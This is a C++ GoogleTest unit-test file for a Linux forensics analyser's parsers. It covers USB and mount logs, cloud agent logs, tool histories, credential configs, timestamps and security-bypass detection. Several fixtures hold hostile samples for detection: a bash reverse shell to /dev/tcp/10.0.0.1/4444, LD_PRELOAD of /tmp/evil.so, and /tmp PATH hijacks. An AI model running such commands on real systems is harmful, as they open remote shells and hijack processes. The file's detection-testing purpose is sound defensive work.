// test_linux_enhanced_parsers_gtest.cpp
// Unit tests for enhanced Linux parsers: USBMountParser, CloudParser,
// ExtendedHistoryParser, SecurityBypassAnalyzer, RuleEngine

#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include "../../src/analyzers/LinuxFilesAnalyzer/Parsers/USBMountParser.h"
#include "../../src/analyzers/LinuxFilesAnalyzer/Parsers/CloudParser.h"
#include "../../src/analyzers/LinuxFilesAnalyzer/Parsers/ExtendedHistoryParser.h"
#include "../../src/analyzers/LinuxFilesAnalyzer/Parsers/Security/SecurityBypassAnalyzer.h"
#include "../../src/analyzers/LinuxFilesAnalyzer/Parsers/TimestampNormalizer.h"

using namespace forensics::linux;

// ============================================================================
// USBMountParser Tests
// ============================================================================

class USBMountParserTest : public ::testing::Test {};

TEST_F(USBMountParserTest, ParseUSBEvent_Connect) {
    // Line must contain "usb" keyword AND VID/PID or sd device on the same line
    std::vector<std::string> lines = {
        "Jan 15 10:30:00 server kernel: usb 1-1: new high-speed USB device number 3 using xhci_hcd, ID 0781:5567"
    };
    auto events = USBMountParser::parseUSBEvents(lines, "/var/log/kern.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].eventType, "CONNECT");
    EXPECT_EQ(events[0].vendorId, "0781");
}

TEST_F(USBMountParserTest, ParseUSBEvent_Disconnect) {
    // Need "usb" keyword AND VID/PID or sd device on the same line
    std::vector<std::string> lines = {
        "Jan 15 10:35:00 server kernel: usb 1-1: USB disconnect, device number 3, ID 0781:5567"
    };
    auto events = USBMountParser::parseUSBEvents(lines, "/var/log/kern.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].eventType, "DISCONNECT");
}

TEST_F(USBMountParserTest, ParseUSBEvent_VidPid) {
    std::vector<std::string> lines = {
        "Jan 15 10:30:00 server kernel: usb 1-1: New USB device found, ID 0781:5567 SanDisk Corp."
    };
    auto events = USBMountParser::parseUSBEvents(lines, "/var/log/kern.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].vendorId, "0781");
    EXPECT_EQ(events[0].productId, "5567");
}

TEST_F(USBMountParserTest, ParseUSBEvent_IgnoreNonUSB) {
    std::vector<std::string> lines = {
        "Jan 15 10:30:00 server sshd[1234]: Accepted publickey for user"
    };
    auto events = USBMountParser::parseUSBEvents(lines, "/var/log/auth.log");
    EXPECT_TRUE(events.empty());
}

TEST_F(USBMountParserTest, ExtractUSBIds_Valid) {
    std::string vid, pid;
    EXPECT_TRUE(USBMountParser::extractUSBIds("ID 0781:5567 SanDisk Corp.", vid, pid));
    EXPECT_EQ(vid, "0781");
    EXPECT_EQ(pid, "5567");
}

TEST_F(USBMountParserTest, ExtractUSBIds_Invalid) {
    std::string vid, pid;
    EXPECT_FALSE(USBMountParser::extractUSBIds("no usb ids here", vid, pid));
}

TEST_F(USBMountParserTest, ParseFstab_ValidEntries) {
    std::string fstab =
        "# /etc/fstab\n"
        "UUID=abc-123 / ext4 errors=remount-ro 0 1\n"
        "//server/share /mnt/nfs cifs credentials=/etc/samba/creds 0 0\n"
        "/dev/sdb1 /mnt/usb ext4 defaults 0 0\n";

    auto entries = USBMountParser::parseFstab(fstab, "/etc/fstab");
    ASSERT_EQ(entries.size(), 3);

    // First entry: root filesystem (UUID= is marked external by parser)
    EXPECT_EQ(entries[0].mountPoint, "/");
    EXPECT_EQ(entries[0].filesystem, "ext4");
    EXPECT_TRUE(entries[0].isExternal);  // UUID= entries are flagged as external
    EXPECT_FALSE(entries[0].isNetwork);

    // Second entry: network mount
    EXPECT_EQ(entries[1].mountPoint, "/mnt/nfs");
    EXPECT_EQ(entries[1].filesystem, "cifs");
    EXPECT_TRUE(entries[1].isNetwork);

    // Third entry: external USB
    EXPECT_EQ(entries[2].mountPoint, "/mnt/usb");
    EXPECT_EQ(entries[2].filesystem, "ext4");
    EXPECT_TRUE(entries[2].isExternal);
}

TEST_F(USBMountParserTest, ParseFstab_SkipsComments) {
    std::string fstab = "# This is a comment\n\nUUID=abc / ext4 defaults 0 1\n";
    auto entries = USBMountParser::parseFstab(fstab, "/etc/fstab");
    ASSERT_EQ(entries.size(), 1);
}

TEST_F(USBMountParserTest, ParseMountOutput_ValidFormat) {
    std::string mount =
        "/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)\n"
        "tmpfs on /tmp type tmpfs (rw,nosuid,nodev)\n";

    auto entries = USBMountParser::parseMountOutput(mount, "/proc/mounts");
    ASSERT_EQ(entries.size(), 2);
    EXPECT_EQ(entries[0].device, "/dev/sda1");
    EXPECT_EQ(entries[0].mountPoint, "/");
    EXPECT_EQ(entries[0].filesystem, "ext4");
}

TEST_F(USBMountParserTest, ParseDesktopLoginLogs_SessionStart) {
    std::vector<std::string> lines = {
        "Jan 15 10:30:00 server lightdm: session opened for user john by (uid=0)"
    };
    auto events = USBMountParser::parseDesktopLoginLogs(lines, "lightdm", "/var/log/auth.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].username, "john");
    EXPECT_EQ(events[0].eventType, "SESSION_START");
    EXPECT_EQ(events[0].displayManager, "lightdm");
}

TEST_F(USBMountParserTest, ParseDesktopLoginLogs_SessionEnd) {
    std::vector<std::string> lines = {
        "Jan 15 11:30:00 server gdm: session closed for user john"
    };
    auto events = USBMountParser::parseDesktopLoginLogs(lines, "gdm", "/var/log/auth.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].username, "john");
    EXPECT_EQ(events[0].eventType, "SESSION_END");
}

// ============================================================================
// CloudParser Tests
// ============================================================================

class CloudParserTest : public ::testing::Test {};

TEST_F(CloudParserTest, ParseCloudInitLog_ValidEntry) {
    std::string content =
        "2024-01-15 10:30:00,123 - cc_modules_user_data.py[INFO]: Running user-data script\n"
        "2024-01-15 10:30:01,456 - cc_modules_network.py[ERROR]: Network config failed\n";

    auto events = CloudParser::parseCloudInitLog(content, "/var/log/cloud-init.log");
    ASSERT_EQ(events.size(), 2);

    EXPECT_EQ(events[0].agentName, "cloud-init");
    EXPECT_EQ(events[0].level, "INFO");
    EXPECT_EQ(events[0].eventType, "USER_DATA");
    EXPECT_NE(events[0].message.find("Running user-data"), std::string::npos);

    EXPECT_EQ(events[1].level, "ERROR");
    EXPECT_EQ(events[1].eventType, "NETWORK");
}

TEST_F(CloudParserTest, ParseCloudInitLog_EmptyContent) {
    auto events = CloudParser::parseCloudInitLog("", "/var/log/cloud-init.log");
    EXPECT_TRUE(events.empty());
}

TEST_F(CloudParserTest, ParseWaagentLog_ValidEntry) {
    std::string content =
        "2024/01/15 10:30:00.123456 [INFO] Agent WALinuxAgent-2.9.1.1 starting\n"
        "2024/01/15 10:30:01.654321 [ERROR] Failed to retrieve Extension handler\n";

    auto events = CloudParser::parseWaagentLog(content, "/var/log/waagent.log");
    ASSERT_EQ(events.size(), 2);

    EXPECT_EQ(events[0].provider, CloudProvider::AZURE);
    EXPECT_EQ(events[0].agentName, "waagent");
    EXPECT_EQ(events[0].level, "INFO");

    EXPECT_EQ(events[1].level, "ERROR");
    EXPECT_EQ(events[1].eventType, "EXTENSION");
}

TEST_F(CloudParserTest, ParseSSMAgentLog_ValidEntry) {
    std::string content =
        "2024-01-15T10:30:00Z [INFO] Starting amazon-ssm-agent\n";

    auto events = CloudParser::parseSSMAgentLog(content, "/var/log/amazon-ssm-agent.log");
    ASSERT_EQ(events.size(), 1);

    EXPECT_EQ(events[0].provider, CloudProvider::AWS);
    EXPECT_EQ(events[0].agentName, "amazon-ssm-agent");
}

TEST_F(CloudParserTest, DetectProvider_Waagent) {
    std::vector<std::string> files = {"/var/log/waagent.log"};
    EXPECT_EQ(CloudParser::detectProvider(files), CloudProvider::AZURE);
}

TEST_F(CloudParserTest, DetectProvider_SSM) {
    std::vector<std::string> files = {"/var/log/amazon-ssm-agent.log"};
    EXPECT_EQ(CloudParser::detectProvider(files), CloudProvider::AWS);
}

TEST_F(CloudParserTest, DetectProvider_GuestAgent) {
    std::vector<std::string> files = {"/var/log/google-guest-agent.log"};
    EXPECT_EQ(CloudParser::detectProvider(files), CloudProvider::GCP);
}

TEST_F(CloudParserTest, DetectProvider_Unknown) {
    std::vector<std::string> files = {"/var/log/other.log"};
    EXPECT_EQ(CloudParser::detectProvider(files), CloudProvider::UNKNOWN);
}

// ============================================================================
// ExtendedHistoryParser Tests
// ============================================================================

class ExtendedHistoryParserTest : public ::testing::Test {};

TEST_F(ExtendedHistoryParserTest, ParsePythonHistory_ValidCommands) {
    std::string content = "import os\nimport subprocess\nos.system('ls')\n";
    auto entries = ExtendedHistoryParser::parsePythonHistory(content, "/home/user/.python_history", "user");
    ASSERT_EQ(entries.size(), 3);
    EXPECT_EQ(entries[0].toolType, "python");
    EXPECT_EQ(entries[0].username, "user");
    EXPECT_EQ(entries[0].command, "import os");
}

TEST_F(ExtendedHistoryParserTest, ParsePythonHistory_EmptyContent) {
    auto entries = ExtendedHistoryParser::parsePythonHistory("", "/home/user/.python_history", "user");
    EXPECT_TRUE(entries.empty());
}

TEST_F(ExtendedHistoryParserTest, ParseMysqlHistory_SelectCommands) {
    std::string content = "SELECT * FROM users;\nSHOW databases;\n";
    auto entries = ExtendedHistoryParser::parseMysqlHistory(content, "/home/user/.mysql_history", "user");
    ASSERT_EQ(entries.size(), 2);
    EXPECT_EQ(entries[0].toolType, "mysql");
}

TEST_F(ExtendedHistoryParserTest, ParsePsqlHistory_MetaCommands) {
    std::string content = "\\dt\n\\d users\nSELECT version();\n";
    auto entries = ExtendedHistoryParser::parsePsqlHistory(content, "/home/user/.psql_history", "user");
    ASSERT_EQ(entries.size(), 3);
    EXPECT_EQ(entries[0].toolType, "psql");
}

TEST_F(ExtendedHistoryParserTest, ParseRedisHistory_AuthCommand) {
    std::string content = "AUTH mypassword\nGET key1\nSET key2 value\n";
    auto entries = ExtendedHistoryParser::parseRedisHistory(content, "/home/user/.rediscli_history", "user");
    ASSERT_EQ(entries.size(), 3);
    EXPECT_EQ(entries[0].toolType, "redis");
    EXPECT_TRUE(entries[0].isSensitive);  // AUTH command
}

TEST_F(ExtendedHistoryParserTest, ParseGitReflog_ValidFormat) {
    std::string content =
        "abc1234 def5678 John Doe <john@example.com> 1705312200 +0800\tcommit: Initial commit\n";
    auto entries = ExtendedHistoryParser::parseGitReflog(content, "/repo/.git/logs/HEAD", "user");
    ASSERT_EQ(entries.size(), 1);
    EXPECT_EQ(entries[0].toolType, "git");
    EXPECT_EQ(entries[0].command, "commit: Initial commit");
}

TEST_F(ExtendedHistoryParserTest, ParseDockerConfig_WithAuth) {
    std::string content = R"({"auths": {"https://index.docker.io/v1/": {"auth": "dXNlcjpwYXNz"}}})";
    auto configs = ExtendedHistoryParser::parseDockerConfig(content, "/home/user/.docker/config.json", "user");
    ASSERT_EQ(configs.size(), 1);
    EXPECT_EQ(configs[0].configType, "docker_config");
    EXPECT_TRUE(configs[0].hasCredentials);
}

TEST_F(ExtendedHistoryParserTest, ParseKubeConfig_WithToken) {
    std::string content =
        "apiVersion: v1\n"
        "clusters:\n"
        "- cluster:\n"
        "    server: https://k8s.example.com\n"
        "    token: my-secret-token\n";

    auto configs = ExtendedHistoryParser::parseKubeConfig(content, "/home/user/.kube/config", "user");
    ASSERT_EQ(configs.size(), 1);
    EXPECT_EQ(configs[0].configType, "kube_config");
    EXPECT_TRUE(configs[0].hasTokens);
}

TEST_F(ExtendedHistoryParserTest, ParseAWSCredentials_WithKeys) {
    std::string content =
        "[default]\n"
        "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
        "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n";

    auto configs = ExtendedHistoryParser::parseAWSCredentials(content, "/home/user/.aws/credentials", "user");
    ASSERT_EQ(configs.size(), 1);
    EXPECT_EQ(configs[0].configType, "aws_credentials");
    EXPECT_TRUE(configs[0].hasCredentials);
    EXPECT_EQ(configs[0].profile, "default");
}

TEST_F(ExtendedHistoryParserTest, FlagSensitive_Password) {
    std::string content = "mysql -u root --password=MySecretPass\n";
    auto entries = ExtendedHistoryParser::parseMysqlHistory(content, "/home/user/.mysql_history", "user");
    ASSERT_EQ(entries.size(), 1);
    EXPECT_TRUE(entries[0].isSensitive);
    EXPECT_FALSE(entries[0].sensitiveReason.empty());
}

TEST_F(ExtendedHistoryParserTest, FlagSensitive_ConnectionString) {
    std::string content = "psql postgres://user:pass@host/db\n";
    auto entries = ExtendedHistoryParser::parsePsqlHistory(content, "/home/user/.psql_history", "user");
    ASSERT_EQ(entries.size(), 1);
    EXPECT_TRUE(entries[0].isSensitive);
}

TEST_F(ExtendedHistoryParserTest, FlagSensitive_NormalCommand) {
    std::string content = "SELECT * FROM users;\n";
    auto entries = ExtendedHistoryParser::parseMysqlHistory(content, "/home/user/.mysql_history", "user");
    ASSERT_EQ(entries.size(), 1);
    EXPECT_FALSE(entries[0].isSensitive);
}

TEST_F(ExtendedHistoryParserTest, ParseGCloudConfig_WithTokens) {
    std::string content = R"({"access_token": "ya29.xxx", "refresh_token": "1/xxx"})";
    auto configs = ExtendedHistoryParser::parseGCloudConfig(content, "/home/user/.config/gcloud/credentials.db", "user");
    ASSERT_EQ(configs.size(), 1);
    EXPECT_TRUE(configs[0].hasTokens);
}

TEST_F(ExtendedHistoryParserTest, ParseAzureProfile_WithTokens) {
    std::string content = R"({"accessToken": "eyJxxx", "refreshToken": "0.Axxx"})";
    auto configs = ExtendedHistoryParser::parseAzureProfile(content, "/home/user/.azure/accessTokens.json", "user");
    ASSERT_EQ(configs.size(), 1);
    EXPECT_TRUE(configs[0].hasTokens);
}

// ============================================================================
// SecurityBypassAnalyzer Tests
// ============================================================================

class SecurityBypassAnalyzerTest : public ::testing::Test {};

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLdSoPreload_SuspiciousLib) {
    std::string content = "/tmp/evil.so\n";
    auto findings = SecurityBypassAnalyzer::analyzeLdSoPreload(content, "/etc/ld.so.preload");
    ASSERT_EQ(findings.size(), 1);
    EXPECT_EQ(findings[0].findingType, "LD_PRELOAD");
    EXPECT_EQ(findings[0].severity, 5);
    EXPECT_TRUE(findings[0].isConfirmed);
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLdSoPreload_NormalLib) {
    std::string content = "/usr/lib/x86_64-linux-gnu/libpthread.so.0\n";
    auto findings = SecurityBypassAnalyzer::analyzeLdSoPreload(content, "/etc/ld.so.preload");
    ASSERT_EQ(findings.size(), 1);
    EXPECT_EQ(findings[0].severity, 3);
    EXPECT_FALSE(findings[0].isConfirmed);
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLdSoPreload_EmptyFile) {
    auto findings = SecurityBypassAnalyzer::analyzeLdSoPreload("", "/etc/ld.so.preload");
    EXPECT_TRUE(findings.empty());
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLdSoPreload_SkipsComments) {
    std::string content = "# This is a comment\n/usr/lib/libpthread.so\n";
    auto findings = SecurityBypassAnalyzer::analyzeLdSoPreload(content, "/etc/ld.so.preload");
    ASSERT_EQ(findings.size(), 1);
    EXPECT_EQ(findings[0].evidence, "/usr/lib/libpthread.so");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLdSoConf_SuspiciousPath) {
    std::string content = "/tmp/evil-libs\n";
    auto findings = SecurityBypassAnalyzer::analyzeLdSoConf(content, "/etc/ld.so.conf");
    ASSERT_EQ(findings.size(), 1);
    EXPECT_EQ(findings[0].findingType, "DYNAMIC_LINKER_HIJACK");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLdSoConf_NormalPath) {
    std::string content = "/usr/local/lib\ninclude /etc/ld.so.conf.d/*.conf\n";
    auto findings = SecurityBypassAnalyzer::analyzeLdSoConf(content, "/etc/ld.so.conf");
    EXPECT_TRUE(findings.empty());
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeEnvironmentFiles_LDPreload) {
    std::string content = "export LD_PRELOAD=/tmp/evil.so\n";
    auto findings = SecurityBypassAnalyzer::analyzeEnvironmentFiles(content, "/etc/profile", "root");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].findingType, "LD_PRELOAD");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeEnvironmentFiles_LDLibraryPath) {
    std::string content = "export LD_LIBRARY_PATH=/opt/custom/lib\n";
    auto findings = SecurityBypassAnalyzer::analyzeEnvironmentFiles(content, "/etc/environment", "root");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].findingType, "ENV_HIJACK");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeEnvironmentFiles_SuspiciousPATH) {
    std::string content = "export PATH=/tmp/bin:$PATH\n";
    auto findings = SecurityBypassAnalyzer::analyzeEnvironmentFiles(content, "/home/user/.bashrc", "user");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].findingType, "PATH_MANIPULATION");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeShellStartup_ReverseShell) {
    std::string content = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
    auto findings = SecurityBypassAnalyzer::analyzeShellStartup(content, "/home/user/.bashrc", "user");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].severity, 5);
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeShellStartup_SudoAlias) {
    std::string content = "alias sudo='sudo -E'\n";
    auto findings = SecurityBypassAnalyzer::analyzeShellStartup(content, "/home/user/.bashrc", "user");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].findingType, "PATH_MANIPULATION");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeShellStartup_NormalAlias) {
    std::string content = "alias ll='ls -la'\nalias grep='grep --color=auto'\n";
    auto findings = SecurityBypassAnalyzer::analyzeShellStartup(content, "/home/user/.bashrc", "user");
    EXPECT_TRUE(findings.empty());
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzePathManipulation_TmpPath) {
    auto findings = SecurityBypassAnalyzer::analyzePathManipulation("/usr/bin:/tmp/bin:/usr/local/bin", "/etc/environment");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].findingType, "PATH_MANIPULATION");
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzePathManipulation_NormalPath) {
    auto findings = SecurityBypassAnalyzer::analyzePathManipulation("/usr/bin:/usr/local/bin:/usr/sbin", "/etc/environment");
    EXPECT_TRUE(findings.empty());
}

TEST_F(SecurityBypassAnalyzerTest, AnalyzeLibraryInjection_LdPreload) {
    std::string content = "Some config with LD_PRELOAD=/usr/lib/evil.so";
    auto findings = SecurityBypassAnalyzer::analyzeLibraryInjection(content, "/etc/some.conf");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].findingType, "DYNAMIC_LINKER_HIJACK");
}

// ============================================================================
// TimestampNormalizer Tests
// ============================================================================

class TimestampNormalizerTest : public ::testing::Test {};

TEST_F(TimestampNormalizerTest, NormalizeSyslog_ValidTimestamp) {
    auto result = TimestampNormalizer::normalizeSyslog("Jan  5 14:30:00", 2024);
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
    EXPECT_EQ(result.inferredYear, 2024);
    EXPECT_EQ(result.originalTimestamp, "Jan  5 14:30:00");
}

TEST_F(TimestampNormalizerTest, NormalizeSyslog_EmptyTimestamp) {
    auto result = TimestampNormalizer::normalizeSyslog("", 2024);
    EXPECT_EQ(result.timestampConfidence, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeDmesg_ValidTimestamp) {
    auto result = TimestampNormalizer::normalizeDmesg("[12345.678901]");
    EXPECT_GT(result.monotonicTimestamp, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeAuditd_ValidTimestamp) {
    auto result = TimestampNormalizer::normalizeAuditd("1700000000.123:456");
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeRFC3339_UTCTimestamp) {
    auto result = TimestampNormalizer::normalizeRFC3339("2024-01-15T10:30:00Z");
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeRFC3339_WithTimezone) {
    auto result = TimestampNormalizer::normalizeRFC3339("2024-01-15T10:30:00+08:00");
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeISO8601_SpaceFormat) {
    auto result = TimestampNormalizer::normalizeISO8601("2024-01-15 10:30:00");
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeApacheTimestamp_ValidFormat) {
    auto result = TimestampNormalizer::normalizeApacheTimestamp("15/Jan/2024:10:30:00 +0800");
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
}

TEST_F(TimestampNormalizerTest, NormalizeJournalRealtime_Microseconds) {
    auto result = TimestampNormalizer::normalizeJournalRealtime(1705312200000000LL);
    EXPECT_GT(result.normalizedUtcTimestamp, 0);
}

// ============================================================================
// Integration Tests
// ============================================================================

class EnhancedParsersIntegrationTest : public ::testing::Test {};

TEST_F(EnhancedParsersIntegrationTest, USBParser_ProvenanceSet) {
    std::vector<std::string> lines = {
        "Jan 15 10:30:00 server kernel: usb 1-1: New USB device found, ID 0781:5567 SanDisk"
    };
    auto events = USBMountParser::parseUSBEvents(lines, "/var/log/kern.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].provenance.parserName, "USBMountParser");
    EXPECT_EQ(events[0].provenance.sourceFile, "/var/log/kern.log");
    EXPECT_FALSE(events[0].provenance.rawRecord.empty());
}

TEST_F(EnhancedParsersIntegrationTest, CloudParser_ProvenanceSet) {
    std::string content = "2024-01-15 10:30:00,123 - cc_modules_user_data.py[INFO]: test\n";
    auto events = CloudParser::parseCloudInitLog(content, "/var/log/cloud-init.log");
    ASSERT_FALSE(events.empty());
    EXPECT_EQ(events[0].provenance.parserName, "CloudParser");
    EXPECT_EQ(events[0].provenance.sourceFile, "/var/log/cloud-init.log");
}

TEST_F(EnhancedParsersIntegrationTest, ExtendedHistoryParser_ProvenanceSet) {
    std::string content = "import os\n";
    auto entries = ExtendedHistoryParser::parsePythonHistory(content, "/home/user/.python_history", "user");
    ASSERT_FALSE(entries.empty());
    EXPECT_EQ(entries[0].provenance.parserName, "ExtendedHistoryParser");
    EXPECT_EQ(entries[0].provenance.sourceFile, "/home/user/.python_history");
}

TEST_F(EnhancedParsersIntegrationTest, SecurityBypassAnalyzer_ProvenanceSet) {
    std::string content = "/tmp/evil.so\n";
    auto findings = SecurityBypassAnalyzer::analyzeLdSoPreload(content, "/etc/ld.so.preload");
    ASSERT_FALSE(findings.empty());
    EXPECT_EQ(findings[0].provenance.parserName, "SecurityBypassAnalyzer");
    EXPECT_EQ(findings[0].provenance.sourceFile, "/etc/ld.so.preload");
}

TEST_F(EnhancedParsersIntegrationTest, CloudParser_MixedProviders) {
    // Test that different provider logs are parsed correctly
    std::string cloudInit = "2024-01-15 10:30:00,123 - cc_modules_user_data.py[INFO]: init\n";
    std::string waagent = "2024/01/15 10:30:00.123456 [INFO] Agent starting\n";
    std::string ssm = "2024-01-15T10:30:00Z [INFO] SSM agent\n";

    auto ciEvents = CloudParser::parseCloudInitLog(cloudInit, "/var/log/cloud-init.log");
    auto waEvents = CloudParser::parseWaagentLog(waagent, "/var/log/waagent.log");
    auto ssmEvents = CloudParser::parseSSMAgentLog(ssm, "/var/log/amazon-ssm-agent.log");

    ASSERT_FALSE(ciEvents.empty());
    ASSERT_FALSE(waEvents.empty());
    ASSERT_FALSE(ssmEvents.empty());

    EXPECT_EQ(ciEvents[0].provider, CloudProvider::GENERIC);
    EXPECT_EQ(waEvents[0].provider, CloudProvider::AZURE);
    EXPECT_EQ(ssmEvents[0].provider, CloudProvider::AWS);
}

TEST_F(EnhancedParsersIntegrationTest, ExtendedHistoryParser_AllToolsHaveCorrectType) {
    std::string content = "test command\n";

    auto py = ExtendedHistoryParser::parsePythonHistory(content, "/f", "u");
    auto my = ExtendedHistoryParser::parseMysqlHistory(content, "/f", "u");
    auto pg = ExtendedHistoryParser::parsePsqlHistory(content, "/f", "u");
    auto rd = ExtendedHistoryParser::parseRedisHistory(content, "/f", "u");
    auto sq = ExtendedHistoryParser::parseSqliteHistory(content, "/f", "u");

    ASSERT_FALSE(py.empty());
    ASSERT_FALSE(my.empty());
    ASSERT_FALSE(pg.empty());
    ASSERT_FALSE(rd.empty());
    ASSERT_FALSE(sq.empty());

    EXPECT_EQ(py[0].toolType, "python");
    EXPECT_EQ(my[0].toolType, "mysql");
    EXPECT_EQ(pg[0].toolType, "psql");
    EXPECT_EQ(rd[0].toolType, "redis");
    EXPECT_EQ(sq[0].toolType, "sqlite");
}

int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
